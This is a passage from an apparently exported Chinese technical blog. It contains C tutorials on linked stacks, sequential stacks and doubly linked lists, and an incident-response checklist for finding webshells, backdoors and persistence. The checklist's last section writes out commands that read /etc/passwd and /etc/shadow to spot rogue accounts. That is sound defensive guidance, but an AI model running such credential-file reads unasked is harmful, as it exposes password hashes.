class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">void InitStack(LinkStackPtr *top) &#123;</span><br><span class="line">    *top = NULL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-判断栈是否为空-若为空则返回-1，否则返回-0"><a href="#3-判断栈是否为空-若为空则返回-1，否则返回-0" class="headerlink" title="3.判断栈是否为空(若为空则返回 1，否则返回 0)"></a>3.判断栈是否为空(若为空则返回 1，否则返回 0)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int IsEmpty(LinkStackPtr top) &#123;</span><br><span class="line">    return top == NULL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-进栈-将元素-x-压入栈顶"><a href="#4-进栈-将元素-x-压入栈顶" class="headerlink" title="4.进栈(将元素 x 压入栈顶)"></a>4.进栈(将元素 x 压入栈顶)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">void Push(LinkStackPtr *top, int x) &#123;</span><br><span class="line">    LinkStackPtr p = (LinkStackPtr)malloc(sizeof(StackNode));    // 为新元素分配内存空间</span><br><span class="line">    p-&gt;data = x;        // 将元素 x 压入栈顶</span><br><span class="line">    p-&gt;next = *top;     // 将新元素插入链表的头部</span><br><span class="line">    *top = p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5-出栈-删除栈顶元素并返回其值"><a href="#5-出栈-删除栈顶元素并返回其值" class="headerlink" title="5.出栈(删除栈顶元素并返回其值)"></a>5.出栈(删除栈顶元素并返回其值)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">int Pop(LinkStackPtr *top) &#123;</span><br><span class="line">    if (IsEmpty(*top)) &#123;    // 栈空，返回空值</span><br><span class="line">        printf(&quot;Stack is empty!\n&quot;);</span><br><span class="line">        return -1;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        LinkStackPtr p = *top;      // 备份栈顶指针</span><br><span class="line">        int x = p-&gt;data;            // 取出栈顶元素</span><br><span class="line">        *top = p-&gt;next;             // 删除栈顶结点</span><br><span class="line">        free(p);                    // 释放栈顶结点的存储空间</span><br><span class="line">        return x;                   // 返回栈顶元素的值</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6-获取栈顶元素"><a href="#6-获取栈顶元素" class="headerlink" title="6.获取栈顶元素"></a>6.获取栈顶元素</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int GetTop(LinkStackPtr top) &#123;</span><br><span class="line">    if (IsEmpty(top)) &#123;             // 栈空，返回空值</span><br><span class="line">        printf(&quot;Stack is empty!\n&quot;);</span><br><span class="line">        return -1;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return top-&gt;data;           // 返回栈顶元素的值</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="7-输出链栈中的元素"><a href="#7-输出链栈中的元素" class="headerlink" title="7.输出链栈中的元素"></a>7.输出链栈中的元素</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">void PrintStack(LinkStackPtr top) &#123;</span><br><span class="line">    if (IsEmpty(top)) &#123;             // 栈空，返回空值</span><br><span class="line">        printf(&quot;Stack is empty!\n&quot;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        printf(&quot;Stack elements: &quot;);</span><br><span class="line">        while (top != NULL) &#123;</span><br><span class="line">            printf(&quot;%d &quot;, top-&gt;data);</span><br><span class="line">            top = top-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        printf(&quot;\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
            <tag> C语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>顺序栈</title>
      <link href="/2023/04/29/%E9%A1%BA%E5%BA%8F%E6%A0%88/"/>
      <url>/2023/04/29/%E9%A1%BA%E5%BA%8F%E6%A0%88/</url>
      
        <content type="html"><![CDATA[<h1 id="顺序栈"><a href="#顺序栈" class="headerlink" title="顺序栈"></a>顺序栈</h1><h2 id="1-顺序栈定义"><a href="#1-顺序栈定义" class="headerlink" title="1. 顺序栈定义"></a>1. 顺序栈定义</h2><p>栈（Stack）：是只允许在一端进行插入或删除的线性表。首先栈是一种线性表，但限定这种线性表只能在某一端进行插入和删除操作。</p><p><img src="/img/%E9%A1%BA%E5%BA%8F%E6%A0%88/%E6%A0%88%E7%BB%93%E6%9E%84.png" alt="title"></p><p>栈又称为后进先出（Last In First Out）的线性表。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">typedef struct Stack</span><br><span class="line">&#123;</span><br><span class="line">  STDataType* a;</span><br><span class="line">  int top;          //有效数据个数</span><br><span class="line">  int capacity;     //容量</span><br><span class="line">&#125;ST;</span><br></pre></td></tr></table></figure><h2 id="2-顺序栈初始化"><a href="#2-顺序栈初始化" class="headerlink" title="2. 顺序栈初始化"></a>2. 顺序栈初始化</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">void StackInit(ST* ps)&#123;</span><br><span class="line">assert(ps);</span><br><span class="line">ps-&gt;a = NULL;</span><br><span class="line">ps-&gt;capacity = 0;</span><br><span class="line">ps-&gt;top = 0;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="3-顺序栈销毁"><a href="#3-顺序栈销毁" class="headerlink" title="3. 顺序栈销毁"></a>3. 顺序栈销毁</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">void StackDestroy(ST* ps)&#123;</span><br><span class="line">assert(ps);</span><br><span class="line">free(ps-&gt;a);</span><br><span class="line">ps-&gt;a = NULL;</span><br><span class="line">ps-&gt;capacity = 0;</span><br><span class="line">ps-&gt;top = 0;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="4-顺序栈插入-压栈"><a href="#4-顺序栈插入-压栈" class="headerlink" title="4. 顺序栈插入(压栈)"></a>4. 顺序栈插入(压栈)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">void StackPush(ST* ps,STDataType x)&#123;</span><br><span class="line">assert(ps);</span><br><span class="line">if(ps-&gt;capacity == ps-&gt;top)&#123;      //判断容量是否足够，如果不够则增容</span><br><span class="line">int newcapacity = ps-&gt;capacity ==0?4:(ps-&gt;capacity)*2; </span><br><span class="line">STDataType* temp = (STDataType*)realloc(ps-&gt;a,sizeof(STDataType)*newcapacity);//扩容</span><br><span class="line">if(temp == NULL)&#123;</span><br><span class="line">printf(&quot;realloc fault&quot;);</span><br><span class="line">exit(-1);</span><br><span class="line">&#125;</span><br><span class="line">ps-&gt;a = temp; //把扩容地址传给a</span><br><span class="line">ps-&gt;capacity = newcapacity; </span><br><span class="line">&#125;</span><br><span class="line">ps-&gt;a[ps-&gt;top] = x; //插入元素x</span><br><span class="line">ps-&gt;top++;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="5-顺序栈删除-出栈"><a href="#5-顺序栈删除-出栈" class="headerlink" title="5. 顺序栈删除(出栈)"></a>5. 顺序栈删除(出栈)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">void StackPop(ST* ps)&#123;</span><br><span class="line">assert(ps);</span><br><span class="line">assert(StackEmpty(ps) != 1);</span><br><span class="line">ps-&gt;top--;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="6-栈顶元素查看"><a href="#6-栈顶元素查看" class="headerlink" title="6. 栈顶元素查看"></a>6. 栈顶元素查看</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">STDataType StackTop(ST* ps)&#123;</span><br><span class="line">assert(ps);</span><br><span class="line">assert(StackEmpty(ps) != 1);</span><br><span class="line"></span><br><span class="line">return ps-&gt;a[ps-&gt;top-1];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="7-查看栈的元素个数"><a href="#7-查看栈的元素个数" class="headerlink" title="7. 查看栈的元素个数"></a>7. 查看栈的元素个数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">int StackSize(ST* ps)&#123;</span><br><span class="line">assert(ps);</span><br><span class="line">     </span><br><span class="line">return ps-&gt;top;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="8-判断栈是否为空-为空返回1"><a href="#8-判断栈是否为空-为空返回1" class="headerlink" title="8.判断栈是否为空 为空返回1"></a>8.判断栈是否为空 为空返回1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int StackEmpty(ST* ps)&#123;</span><br><span class="line">assert(ps);</span><br><span class="line">if(ps-&gt;top == 0)&#123;</span><br><span class="line">return 1;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">return 0;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
            <tag> C语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>双链表</title>
      <link href="/2023/04/16/%E5%8F%8C%E9%93%BE%E8%A1%A8/"/>
      <url>/2023/04/16/%E5%8F%8C%E9%93%BE%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="双向链表"><a href="#双向链表" class="headerlink" title="双向链表"></a>双向链表</h1><h2 id="1-双向链表的定义"><a href="#1-双向链表的定义" class="headerlink" title="1. 双向链表的定义"></a>1. 双向链表的定义</h2><p>双向带头循环链表<br><img src="/img/%E5%8F%8C%E9%93%BE%E8%A1%A8/List.png" alt="title"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">typedef struct ListNode</span><br><span class="line">&#123;   </span><br><span class="line">LTDataType data;</span><br><span class="line">struct ListNode *prev;</span><br><span class="line">struct ListNode *next;</span><br><span class="line">&#125;LTNode;</span><br></pre></td></tr></table></figure><h2 id="2-链表初始化"><a href="#2-链表初始化" class="headerlink" title="2. 链表初始化"></a>2. 链表初始化</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">LTNode* ListInit()</span><br><span class="line">&#123;</span><br><span class="line">   LTNode* phead = (LTNode*)malloc(sizeof(LTNode));</span><br><span class="line">   phead-&gt;next = phead;</span><br><span class="line">   phead-&gt;prev = phead;</span><br><span class="line"></span><br><span class="line">   return phead;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="3-创建新的节点"><a href="#3-创建新的节点" class="headerlink" title="3. 创建新的节点"></a>3. 创建新的节点</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">LTNode* BuyListNode(LTDataType x)</span><br><span class="line">&#123;</span><br><span class="line">LTNode* newnode = (LTNode*)malloc(sizeof(LTNode));</span><br><span class="line">newnode-&gt;data = x;</span><br><span class="line">newnode-&gt;next = NULL;</span><br><span class="line">newnode-&gt;prev = NULL;</span><br><span class="line"></span><br><span class="line">return newnode;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="4-尾插"><a href="#4-尾插" class="headerlink" title="4. 尾插"></a>4. 尾插</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">void ListPushBack(LTNode* phead,LTDataType x)</span><br><span class="line">&#123;</span><br><span class="line">   assert(phead);</span><br><span class="line">   LTNode* tail = phead-&gt;prev;</span><br><span class="line">   LTNode* newnode =(LTNode*)malloc(sizeof(LTNode));</span><br><span class="line">   newnode-&gt;data = x;</span><br><span class="line"></span><br><span class="line">   tail-&gt;next = newnode;</span><br><span class="line">   newnode-&gt;prev = tail;</span><br><span class="line">   newnode-&gt;next = phead;</span><br><span class="line">   phead-&gt;prev = newnode;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="5-头插"><a href="#5-头插" class="headerlink" title="5. 头插"></a>5. 头插</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">void ListPushFront(LTNode* phead,LTDataType x)</span><br><span class="line">&#123;</span><br><span class="line">assert(phead != NULL);</span><br><span class="line">    LTNode* newnode = BuyListNode(x);</span><br><span class="line">LTNode* tail = phead-&gt;next;</span><br><span class="line">phead-&gt;next = newnode;</span><br><span class="line">newnode-&gt;prev = phead;</span><br><span class="line">newnode-&gt;next = tail;</span><br><span class="line">tail-&gt;prev = newnode;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="6-尾删"><a href="#6-尾删" class="headerlink" title="6. 尾删"></a>6. 尾删</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">void ListPopBack(LTNode* phead)</span><br><span class="line">&#123;</span><br><span class="line">    assert(phead != NULL);</span><br><span class="line">assert(phead-&gt;next != phead);</span><br><span class="line">LTNode* tail = phead-&gt;prev;</span><br><span class="line">LTNode* tailprev = tail-&gt;prev;</span><br><span class="line">free(tail);</span><br><span class="line">tailprev-&gt;next = phead;</span><br><span class="line">phead-&gt;prev = tailprev;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="7-头删"><a href="#7-头删" class="headerlink" title="7. 头删"></a>7. 头删</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">void ListPopFront(LTNode* phead)</span><br><span class="line">&#123;</span><br><span class="line">assert(phead != NULL);</span><br><span class="line">assert(phead-&gt;next != phead);</span><br><span class="line">LTNode* tail = phead-&gt;next;</span><br><span class="line">LTNode* next = tail-&gt;next;</span><br><span class="line">free(tail);</span><br><span class="line">phead-&gt;next = next;</span><br><span class="line">next-&gt;prev = phead;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="8-pos位置删除"><a href="#8-pos位置删除" class="headerlink" title="8. pos位置删除"></a>8. pos位置删除</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">void ListErase(LTNode* pos)</span><br><span class="line">&#123;</span><br><span class="line">assert(pos != NULL);</span><br><span class="line">LTNode* posPrev = pos-&gt;prev;</span><br><span class="line">LTNode* posNext = pos-&gt;next;</span><br><span class="line">    free(pos);</span><br><span class="line">posPrev-&gt;next = posNext;</span><br><span class="line">posNext-&gt;prev = posPrev;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="9-查找"><a href="#9-查找" class="headerlink" title="9. 查找"></a>9. 查找</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">LTNode* ListFind(LTNode* phead,LTDataType x)</span><br><span class="line">&#123;</span><br><span class="line">    assert(phead);</span><br><span class="line">LTNode* cur = phead-&gt;next;</span><br><span class="line">while(cur != phead)</span><br><span class="line">&#123;</span><br><span class="line">if(cur-&gt;data == x)</span><br><span class="line">&#123;</span><br><span class="line">  return cur; </span><br><span class="line">&#125;</span><br><span class="line">    cur = cur-&gt;next; </span><br><span class="line">&#125;</span><br><span class="line">return NULL;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="10-pos位置之前插入"><a href="#10-pos位置之前插入" class="headerlink" title="10. pos位置之前插入"></a>10. pos位置之前插入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">void ListInsert(LTNode* pos,LTDataType x)</span><br><span class="line">&#123;</span><br><span class="line">assert(pos != NULL);</span><br><span class="line">LTNode* posPrev = pos-&gt;prev;</span><br><span class="line">LTNode* newnode = BuyListNode(x);</span><br><span class="line">posPrev-&gt;next = newnode;</span><br><span class="line">newnode-&gt;prev = posPrev;</span><br><span class="line">newnode-&gt;next = pos;</span><br><span class="line">pos-&gt;prev = newnode;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="11-pos位置删除"><a href="#11-pos位置删除" class="headerlink" title="11. pos位置删除"></a>11. pos位置删除</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">void ListErase(LTNode* pos)</span><br><span class="line">&#123;</span><br><span class="line">assert(pos != NULL);</span><br><span class="line">LTNode* posPrev = pos-&gt;prev;</span><br><span class="line">LTNode* posNext = pos-&gt;next;</span><br><span class="line"></span><br><span class="line">posPrev-&gt;next = posNext;</span><br><span class="line">posNext-&gt;prev = posPrev;</span><br><span class="line">free(pos);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="12-双向链表的销毁"><a href="#12-双向链表的销毁" class="headerlink" title="12.双向链表的销毁"></a>12.双向链表的销毁</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">void ListDestroy(LTNode* phead)</span><br><span class="line">&#123;</span><br><span class="line">assert(phead != NULL);</span><br><span class="line">LTNode* cur = phead-&gt;next;</span><br><span class="line">while(cur != phead)</span><br><span class="line">&#123;</span><br><span class="line">LTNode* next = cur-&gt;next;</span><br><span class="line">    free(cur);</span><br><span class="line">cur = next;</span><br><span class="line">&#125;</span><br><span class="line">free(phead);      </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>用完Destroy后要将传过来的指针手动置空，这是因为要保证传参结构的一致性（都是传一级指针），如果要在Destroy内置空，要用二级指针实现。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
            <tag> C语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>应急响应总结</title>
      <link href="/2023/04/10/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%80%BB%E7%BB%93/"/>
      <url>/2023/04/10/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="web服务应急"><a href="#web服务应急" class="headerlink" title="web服务应急"></a>web服务应急</h1><h2 id="异常特征"><a href="#异常特征" class="headerlink" title="异常特征:"></a>异常特征:</h2><p>流量异常 设备告警</p><h2 id="处理思路"><a href="#处理思路" class="headerlink" title="处理思路:"></a>处理思路:</h2><ol><li>获取受攻击Web服务器的组成架构(脚本语言 数据库 中间件 操作系统等)</li><li>基于时间 可能利用的漏洞 后门查杀筛选 查看日志，分析攻击行为</li></ol><h2 id="不同中间件的日志分析"><a href="#不同中间件的日志分析" class="headerlink" title="不同中间件的日志分析"></a>不同中间件的日志分析</h2><h3 id="日志查看方式"><a href="#日志查看方式" class="headerlink" title="日志查看方式"></a>日志查看方式</h3><ul><li>IIS日志:<ul><li>通过IIS管理器查看</li><li>通过指定路径查看:<br>  Windows Server 2003 中的 IIS 6:</li></ul><p>  <code>C:\Windows\System32\LogFiles</code><br>  Windows Server 2008 R2 及以后版本（包括 Windows Server 2012, 2016, 2019）中的 IIS 7 及更高版本：<br>  <code>C:\inetpub\logs\LogFiles</code></p></li><li>Apache日志:<ul><li>windows</li></ul><p>  <code>D:\xampp\apache\logs\access.log</code> <code>D:\xampp\apache\logs\error.log </code></p><ul><li>linux</li></ul><p>  <code>/etc/httpd/logs/access_log</code><br>  或<br>  <code>/var/log/httpd/access_log</code></p></li><li>Tomcat日志:<ul><li>windows<br>  Tomcat的日志文件默认存放在Tomcat安装目录下的logs子目录中Tomcat安装在D:\apache-tomcat-9.0.0.M1，那么日志文件的路径就是<code>D:\apache-tomcat-9.0.0.M1\logs</code><br>  一般看<code>localhost_access_log.YYYY-MM-DD.txt</code>文件</li><li>Linux</li></ul><p>  &#96;&#96;&#96;&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;logs&#96;&#96;</p></li></ul><h3 id="日志分析方式"><a href="#日志分析方式" class="headerlink" title="日志分析方式"></a>日志分析方式</h3><ol><li>看时间</li><li>看请求方式 POST方式比较可疑</li><li>看请求URL和状态码 如果用了目录扫描器 会访问一些不存在的页面</li><li>看UA头 有些工具的UA头会暴露攻击行为</li></ol><ul><li>tips: 结合everything 可以做到多个文本同时搜索内容</li></ul><h2 id="木马查杀"><a href="#木马查杀" class="headerlink" title="木马查杀"></a>木马查杀</h2><h3 id="常规webshell查杀"><a href="#常规webshell查杀" class="headerlink" title="常规webshell查杀"></a>常规webshell查杀</h3><ul><li>工具: <ul><li>阿里伏魔:<a href="https://ti.aliyun.com/#/overview">https://ti.aliyun.com/#/overview</a> (在线查杀，需要自己上传，并且有大小限制)</li><li>河马(客户端，支持linux和windows <a href="http://www.shellpub.com/">http://www.shellpub.com</a>)</li><li>D盾(客户端，只支持windows)</li></ul></li></ul><h3 id="webshell内存马查杀"><a href="#webshell内存马查杀" class="headerlink" title="webshell内存马查杀"></a>webshell内存马查杀</h3><ul><li>java 内存马查杀<ul><li>河马内存马扫描或者tomcat-memshell-scanner.jsp(针对java tomcat): 把jsp文件放入web目录下即可</li><li>将扫描到的可疑对象的文件dump下来 放到查杀平台上面查杀确定</li><li>确定内存马后通过everything等工具查找到内存马的在jvm缓存文件中的位置,先结束进程然后进行删除，重启服务即可</li></ul></li><li>php 内存马查杀<ul><li>常规后门查杀检测后，中间件重启即可</li></ul></li><li>.NET <ul><li>ASP.NET-Memshell-Scanner：<br>  <a href="https://github.com/yzddmr6/ASP.NET-Memshell-Scanner">https://github.com/yzddmr6/ASP.NET-Memshell-Scanner</a></li></ul></li></ul><p>tips: web服务被攻击一般都需要看日志去分析，如果日志被删了，可以恢复，日志被删除说明攻击者已经大概率已经拿到主机权限了(webshell权限删不了日志)</p><h2 id="隐藏的webshell发现"><a href="#隐藏的webshell发现" class="headerlink" title="隐藏的webshell发现"></a>隐藏的webshell发现</h2><ul><li>文件MD5校验：将所有网站文件计算一次 hash 值保存，当出现应急情况时，重新计算一次 hash 值，并与上次保存的 hash 值进行对比，从而输出新创建的、修改过及删除的文件列表。</li><li>diff命令(linux)：diff 命令可以用来比较两个文本文件的差异。同样，我们可以通过一行命令快速找出两个项目文件的差异</li></ul><p><code> diff -c -a -r &lt;项目1&gt; &lt;项目2&gt;</code></p><ul><li>版本控制工具：比如说git，重新上传代码到git，然后打开项目，点击commit，在历史提交版本里面，查看文件更改内容，很容易就可以发现代码被篡改的地方</li><li>文件比对工具：Beyond Compare 和 WinMerge</li></ul><h2 id="网站被挂黑链接应急"><a href="#网站被挂黑链接应急" class="headerlink" title="网站被挂黑链接应急"></a>网站被挂黑链接应急</h2><p>被挂黑链接一般和JS代码有关(用js代码实现跳转)，找到js代码然后删除即可(一般会在根目录)</p><h1 id="系统应急"><a href="#系统应急" class="headerlink" title="系统应急"></a>系统应急</h1><h2 id="window常规后门查杀和权限维持检测"><a href="#window常规后门查杀和权限维持检测" class="headerlink" title="window常规后门查杀和权限维持检测"></a>window常规后门查杀和权限维持检测</h2><ul><li>查进程(火绒剑)</li><li>查自启动项(火绒剑)</li><li>隐藏账号检测(D盾)</li><li>检查映像劫持(Autoruns的imagehijacks选项卡或者pchunter)</li><li>查最近打开文件(LastActivityView)</li><li>host文件检查，防止钓鱼</li></ul><h2 id="linux常规后门查杀和权限维持检测"><a href="#linux常规后门查杀和权限维持检测" class="headerlink" title="linux常规后门查杀和权限维持检测"></a>linux常规后门查杀和权限维持检测</h2><h3 id="常规后门查杀"><a href="#常规后门查杀" class="headerlink" title="常规后门查杀"></a>常规后门查杀</h3><ul><li>查进程(netstat命令)<ul><li>netstat参数(一般用netstat -anpt)<br>  -a：显示所有连线中的Socket<br>  -n：直接使用IP地址，而不通过域名服务器<br>  -p：显示正在使用Socket的程序识别码和程序名称<br>  -t：显示TCP传输协议的连线状况</li><li>查看到可疑进程用<code>kill &lt;pid值&gt;</code> 杀死进程，然后删除后门文件</li></ul></li></ul><h3 id="权限维持检测"><a href="#权限维持检测" class="headerlink" title="权限维持检测"></a>权限维持检测</h3><ul><li><p>查计划任务<br>  <code>crontab -l</code></p></li><li><p>查开机自启动</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">more /etc/rc.local</span><br><span class="line">more /etc/rc.d/rc[0~6].d</span><br><span class="line">ls -l /etc/rc.d/rc3.d/</span><br></pre></td></tr></table></figure></li><li><p>查看异常账户</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br><span class="line">cat /etc/shadow</span><br></pre></td></tr></table></figure><p>  